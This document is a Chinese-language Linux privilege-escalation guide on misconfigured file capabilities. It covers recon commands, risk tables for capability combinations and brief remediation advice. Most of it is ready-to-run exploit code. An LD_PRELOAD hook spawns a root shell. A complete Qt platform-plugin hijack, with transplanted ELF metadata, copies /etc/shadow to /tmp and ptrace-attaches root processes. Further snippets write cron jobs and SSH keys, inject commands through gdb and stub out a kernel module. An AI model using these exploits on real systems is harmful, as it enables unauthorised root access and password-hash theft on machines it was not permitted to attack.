# 文件能力（Capabilities）分析与利用

## 侦察命令

```bash
# 查看指定文件的能力
getcap <binary-path>

# 查找所有具有能力的文件
getcap -r / 2>/dev/null

# 查看进程能力
cat /proc/<pid>/status | grep Cap

# 能力解码
python3 -c "print(bin(<cap-value>))"
```

## 高危能力说明

| 能力 | 危害 |
|------|------|
| `cap_dac_override` | 绕过所有文件权限检查，读/写/执行任意文件 |
| `cap_dac_read_search` | 绕过文件读+目录搜索权限，读取任意文件 |
| `cap_sys_ptrace` | 可 ptrace 任意进程，代码注入/凭证窃取 |
| `cap_sys_module` | 可加载任意内核模块，ring-0 代码执行 |
| `cap_sys_admin` | 近乎 root 权限：可挂载/卸载、设置主机名、操作命名空间等 |
| `cap_sys_rawio` | 裸磁盘 I/O，绕过文件系统读写任意磁盘块 |
| `cap_chown` | 可修改任意文件属主，接管敏感文件 |
| `cap_fowner` | 绕过文件属主权限检查，访问任意文件 |
| `cap_net_raw` | 使用原始套接字，可能用于网络攻击 |
| `cap_sys_boot` | 重启系统 |
| `cap_setuid` | 设置 UID，可提权 |
| `cap_setfcap` | 可给任意文件**授予能力**（含把 `cap_dac_override` 给自己的工具）→ 权限自我复制 |
| `cap_net_admin` | 网络栈管理：改路由/iptables/创建隧道，流量劫持与隔离绕过 |
| `cap_audit_write` | 可写审计日志（伪造/注水），掩盖行为 |
| `cap_sys_chroot` | chroot 逃逸（经典 `chroot` + 双 chroot 技巧 → 宿主文件系统） |
| `cap_bpf` / `cap_sys_admin`+BPF | 加载 eBPF 程序 → 内核态代码执行/提权 |

> 定级词汇统一：本文件 P0/P1/P2 与 suid-analysis、dbus-authz 的 P0–P3 同义（**优先级排序**，非 CVSS 等级）；报告定级一律按 report-template.md 的 CVSS 流程。

## 能力组合风险分析

### P0 级组合

| 组合 | 风险 | 利用方向 |
|------|------|---------|
| `cap_dac_override` + `cap_sys_rawio` | 裸磁盘 I/O 绕过文件系统 | 直接读写磁盘块 |
| `cap_dac_override` + `cap_sys_ptrace` | ptrace 注入特权进程 | 注入 root 进程 |
| `cap_sys_module` + `cap_sys_admin` | 加载内核模块 | ring-0 代码执行 |
| `cap_dac_override` + `cap_sys_module` | 绕过权限+加载模块 | 完全控制系统 |
| `cap_chown` + `cap_fowner` | 改属主+绕过属主检查 | 接管任意文件 |
| `cap_dac_override` + `cap_fowner` | 绕过权限+绕过属主 | 无限制文件访问 |

### P1 级组合

| 组合 | 风险 | 利用方向 |
|------|------|---------|
| `cap_dac_override` + `cap_dac_read_search` | 任意文件读写 | 读取敏感文件 |
| `cap_sys_ptrace` alone | ptrace 任意进程 | 代码注入 |
| `cap_sys_admin` alone | 近乎 root | 多种提权路径 |
| `cap_dac_override` alone | 绕过文件权限 | 读写任意文件 |

### P2 级组合

| 组合 | 风险 | 利用方向 |
|------|------|---------|
| `cap_dac_read_search` alone | 任意文件读取 | 信息泄露 |
| `cap_net_raw` alone | 原始套接字 | 网络嗅探 |

## 进程内代码执行注入（LD_PRELOAD / Qt 插件目录劫持）

**定位**：这两种手法是**同一个利用方式的两个载体**——让带能力的进程加载攻击者控制的库/插件，
`__attribute__((constructor))` 构造器携带进程的全部有效能力执行。LD_PRELOAD 针对通用二进制；
Qt 平台插件目录劫持针对 Qt 二进制（平台插件路径变量不受 AT_SECURE 过滤）。
前提：二进制带文件能力或 SUID，且普通用户可执行 → 该二进制即特权进程，
此手法用于在其内部获得代码执行，并验证/放大其能力。

### 1. LD_PRELOAD 注入（通用二进制）

**触发条件**：SUID 二进制未做 `AT_SECURE` 防护，或具有 capability 的二进制允许 LD_PRELOAD。
**注意**：cap/SUID 二进制激活 `AT_SECURE=1` 时 GLIBC **忽略 LD_PRELOAD** → 此路不通，
换下面的 Qt 插件劫持替代面。

```bash
cat > /tmp/hook.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor))
static void init(void) {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
}
EOF
gcc -shared -fPIC -o /tmp/hook.so /tmp/hook.c -ldl
LD_PRELOAD=/tmp/hook.so <binary>   # AT_SECURE 下被忽略 → 注入失败
```

### 2. Qt 平台插件目录劫持（针对 Qt 二进制）

**原理**：`AT_SECURE` 只让 ld.so 忽略 `LD_PRELOAD`/`LD_LIBRARY_PATH`，**Qt 平台插件加载器仍信任
插件路径环境变量**。将 `QT_QPA_PLATFORM_PLUGIN_PATH` 指向用户可控目录（该目录被置于插件搜索列表
**第一位**），恶意平台插件被 dlopen，构造器即携带进程的全部有效能力执行。

**变量语义速查**：

| 环境变量 | 语义 | 攻击用途 |
|---------|------|---------|
| `QT_QPA_PLATFORM_PLUGIN_PATH` | 平台插件目录"本身"（**不加**子目录），先于系统目录搜索 | ⭐ 主攻击变量 |
| `QT_PLUGIN_PATH` | 插件**根**目录（需再拼 `/platforms` 等子目录） | 仅影响根级目录扫描，平台加载器一般不采用 |
| `QT_QPA_PLATFORM` | 指定平台名：`minimal`/`xcb`/`wayland`… | `minimal` 无需 DISPLAY，SSH/无头环境即可触发 |

**元数据门槛**：Qt 5.15 的 `QFactoryLoader` 用 QElfParser **直接读 ELF 的 `.qtmetadata` 段**
做 IID/Keys 匹配，无元数据的 .so 只被"读头部"检查后跳过、**不会被 dlopen**。
必须移植合法元数据：Keys 匹配优先于文件名，将 `libqminimal.so` 的元数据（Keys=["minimal"]）
移植到恶意库后，请求 `QT_QPA_PLATFORM=minimal` 即可命中。

**利用五步**：

```bash
# 0. 权限基线
getcap /usr/bin/<bin>                   # 有输出（如 cap_dac_read_search,cap_sys_ptrace=ep）
cat /etc/shadow 2>&1 | head -1          # Permission denied → 需要 root

# 1. 确认是 Qt 程序 + 找平台插件目录
ldd /usr/bin/<bin> | grep -i qt5
ls /usr/lib/x86_64-linux-gnu/qt5/plugins/platforms/

# 2. 提取系统插件的合法元数据（libqminimal 的 Keys=["minimal"]）
mkdir -p /tmp/plug
OFF=$(readelf -SW /usr/lib/x86_64-linux-gnu/qt5/plugins/platforms/libqminimal.so | awk '/\.qtmetadata/{print $5}')
SZ=$(readelf -SW /usr/lib/x86_64-linux-gnu/qt5/plugins/platforms/libqminimal.so | awk '/\.qtmetadata/{print $6}')
dd if=/usr/lib/x86_64-linux-gnu/qt5/plugins/platforms/libqminimal.so of=/tmp/plug/meta.bin \
   bs=1 skip=$((0x$OFF)) count=$((0x$SZ)) 2>/dev/null

# 3. 构建恶意库：构造器 fork 持留子进程（fork 不 exec，完整继承有效能力）
cat > /tmp/plug/pwn.c <<'EOF'
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <dirent.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/wait.h>

/* 选一个真实 root 用户态进程（避开内核线程：pid<100 或 cmdline 为空） */
static int pick_root_pid(void){
    DIR *d = opendir("/proc"); struct dirent *e; int ret = -1;
    while (d && (e = readdir(d))) {
        if (e->d_name[0] < '1' || e->d_name[0] > '9') continue;
        int pid = atoi(e->d_name); if (pid < 100) continue;
        char p[64]; snprintf(p, sizeof p, "/proc/%d/status", pid);
        FILE *f = fopen(p, "r"); char line[256]; int root = 0;
        while (f && fgets(line, sizeof line, f))
            if (!strncmp(line, "Uid:", 4)) { unsigned r; if (sscanf(line+4,"%u%*u%*u%*u",&r)==1 && r==0) root=1; break; }
        if (f) fclose(f); if (!root) continue;
        char cl[64]; snprintf(cl, sizeof cl, "/proc/%d/cmdline", pid);
        int cfd = open(cl, O_RDONLY); char b[16];
        if (cfd >= 0) { int n = read(cfd, b, 16); close(cfd); if (n <= 0) continue; }
        ret = pid; break;
    }
    if (d) closedir(d); return ret;
}
__attribute__((constructor)) static void pwn(void){
    if (fork() != 0) return;              /* 子进程继承全部有效能力 */
    setsid();
    /* cap_dac_read_search 验证：越权读 /etc/shadow */
    FILE *sh = fopen("/etc/shadow", "r");
    if (sh) { int x = open("/tmp/uksm-shadow-exfil", O_WRONLY|O_CREAT|O_TRUNC, 0600);
        char l[128]; fgets(l, 128, sh); if (x >= 0) write(x, l, strlen(l)); close(x); fclose(sh); }
    /* cap_sys_ptrace 验证：附加 root 进程后分离 */
    int rp = pick_root_pid();
    if (rp > 0 && ptrace(PTRACE_ATTACH, rp, 0, 0) == 0) {
        int st; waitpid(rp, &st, 0); ptrace(PTRACE_DETACH, rp, 0, 0);
    }
    for (;;) pause();                     /* 长驻保持能力 */
}
EOF
gcc -shared -fPIC -o /tmp/plug/pwnlib.so /tmp/plug/pwn.c

# 4. 移植元数据段
cp /tmp/plug/pwnlib.so /tmp/plug/libqminimal.so
objcopy --add-section .qtmetadata=/tmp/plug/meta.bin \
        --set-section-flags .qtmetadata=alloc,readonly /tmp/plug/libqminimal.so

# 5. 触发 + 系统级验证（minimal 平台无需 DISPLAY，SSH 会话即可）
QT_QPA_PLATFORM=minimal QT_QPA_PLATFORM_PLUGIN_PATH=/tmp/plug /usr/bin/<bin> &
sleep 3
cat /tmp/uksm-shadow-exfil                      # /etc/shadow 内容 → 越权读取成立
pgrep -f /usr/bin/<bin> | while read p; do grep -E '^(Uid|CapEff)' /proc/$p/status; done
# 持留子进程 CapEff 与父进程一致（如 0000000000083004 = cap_dac_read_search|cap_net_raw|cap_net_admin|cap_sys_ptrace）
```

**常见误判**：
1. 目录被扫描（strace 见 openat 自己的目录）≠ 会被 dlopen —— 用构造器当探针实证，先确认"谁在扫描、会不会加载"
2. 单变量对照：`QT_PLUGIN_PATH` 与 `QT_QPA_PLATFORM_PLUGIN_PATH` 一次只设一个，用 strace openat 判定哪个被采用（实测只有后者生效）
3. ptrace 验证目标避开内核线程（pid<100、`/proc/PID/cmdline` 为空，如 kthreadd 不可附加），选真实 root 用户态进程
4. 部分加固内核（`/proc/PID/status` 无 Dumpable 行、同用户 ptrace 带能力进程被 EPERM）会堵死"外部附加夺权"路线——先验证 ptrace 可达性再选路线，不可达时改走"进程内代码执行"（正对应本手法）
5. 工具教训：`pkill -f` 会匹配自身命令行导致 shell 自杀；"修复无效"先验证修复落地（grep 源码 / md5sum 产物）再怀疑环境

**修复建议**：`setcap -r` 移除误配能力且不回退 SUID；进程启动即降权（securebits / PR_SET_NO_NEW_PRIVS / seccomp / capset）；
Qt 对 AT_SECURE 进程过滤 `QT_QPA_PLATFORM_PLUGIN_PATH`/`QT_PLUGIN_PATH`。

## 利用方法

### 1. 任意文件读取

```bash
# 当有 cap_dac_override 或 cap_dac_read_search 时
<binary>  # 直接调用，观察是否有文件操作
# 或通过符号链接
ln -s /etc/shadow /tmp/shadow
<binary> /tmp/shadow
```

### 2. 任意文件写入

```bash
# 当有 cap_dac_override 时
# 例：写入 SSH authorized_keys
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# 例：写入 cron 任务
echo "* * * * * root id > /tmp/pwned" > /etc/cron.d/exploit
```

### 3. 进程注入

```bash
# 当有 cap_sys_ptrace 时
# 找到目标进程
ps aux | grep <target>

# ptrace 注入
gdb -p <pid>
(gdb) call (int)system("id > /tmp/pwned")
(gdb) detach
(gdb) quit
```

### 4. 内核模块加载

```bash
# 当有 cap_sys_module 时
# 编译内核模块
cat > /tmp/exploit.c << 'EOF'
#include <linux/module.h>
#include <linux/kernel.h>
MODULE_LICENSE("GPL");
module_init(exploit_init);
static int __init exploit_init(void) {
    printk(KERN_INFO "Exploit loaded!\n");
    return 0;
}
EOF
# 编译并加载（需要内核头文件）
```

## 验证命令

```bash
# 验证能力利用是否成功
# 根据具体漏洞类型选择验证命令

# 例：文件读取验证
cat /etc/shadow 2>&1 | head -5

# 例：文件写入验证
ls -la /etc/cron.d/exploit
cat /etc/cron.d/exploit

# 例：进程注入验证
cat /tmp/pwned
```
